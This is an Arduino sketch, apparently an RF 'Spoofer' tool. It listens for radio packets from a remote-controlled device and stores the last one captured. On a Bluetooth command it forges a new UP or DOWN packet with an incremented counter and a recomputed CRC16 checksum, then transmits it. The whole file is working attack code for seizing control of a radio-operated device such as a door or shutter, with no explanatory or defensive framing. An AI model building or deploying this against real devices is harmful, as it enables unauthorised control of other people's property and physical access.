#include <SoftwareSerial.h>
#include <VirtualWire.h>
#include "Arduino.h"
#include "uCRC16BPBLib.h"

const int LEN = 7;
const int RECIEVER_PIN = 12;
const int TRANSMIT_PIN = 11;

const byte UP = 0xAB;
const byte DOWN = 0xAE;

uCRC16BPBLib crc;
SoftwareSerial bluetooth(2, 4);

byte message[LEN];
byte messageLength = LEN;
int intercepted = 0;

byte part_A = 0, part_B = 0;

void get_checksum(byte params[]) {
  crc.reset();
  crc.feedByte(params[1]);
  crc.feedByte(params[2]);
  crc.feedByte(params[3]); 
  uint16_t p = crc.getResult();
  uint8_t xlow = p & 0xff;
  uint8_t xhigh = (p >> 8);
  part_A = xhigh;
  part_B = xlow;
}

void repeat_last(byte command) {
  if (intercepted == 0) {
    Serial.println("Aborting because no recieved packages..");
    return;  
  }
  Serial.println("Recieved command via Bluetooth..");
  Serial.println(command, HEX);
  byte prev_message[LEN];
  for (int i = 0; i < LEN; i++) {
    prev_message[i] = message[i];
  }
  prev_message[1] = command;
  prev_message[3]++;
  if (prev_message[3] == 0) {
    prev_message[2]++;
  }
  get_checksum(prev_message);
  prev_message[4] = part_A;
  prev_message[5] = part_B;
  Serial.println("New package generated");
  for (int i = 0; i < LEN; i++) {
    Serial.print(prev_message[i], HEX);
    Serial.print(" ");
    message[i] = prev_message[i];
  }
  Serial.println();
  vw_send(message, LEN);
  vw_wait_tx();
}

void setup() {
  Serial.begin(9600);
  bluetooth.begin(9600);
  delay(200);
  bluetooth.print("Spoofer");
  Serial.println("Reciever is ready");
  vw_set_rx_pin(RECIEVER_PIN);
  vw_set_tx_pin(TRANSMIT_PIN);
  vw_setup(2000);
  vw_rx_start();
  delay(3000);
}

void loop() {
  if (bluetooth.available()) {
    char value = bluetooth.read();
    if (value == '1') {
      repeat_last(UP);
    } else if (value == '2') {
      repeat_last(DOWN);
    }
  }
  if (vw_get_message(message, &messageLength)) {
    intercepted++;
    for (int i = 0; i < messageLength; i++) {
      Serial.print(message[i], HEX);
      Serial.print(" ");
    }
    Serial.println();
    String time_hash = String(message[4], HEX) + " " + String(message[5], HEX);
    unsigned char* buf = new unsigned char[100];
    time_hash.getBytes(buf, 100, 0);
    const char *str2 = (const char*) buf;
    bluetooth.write(str2);
  }
}
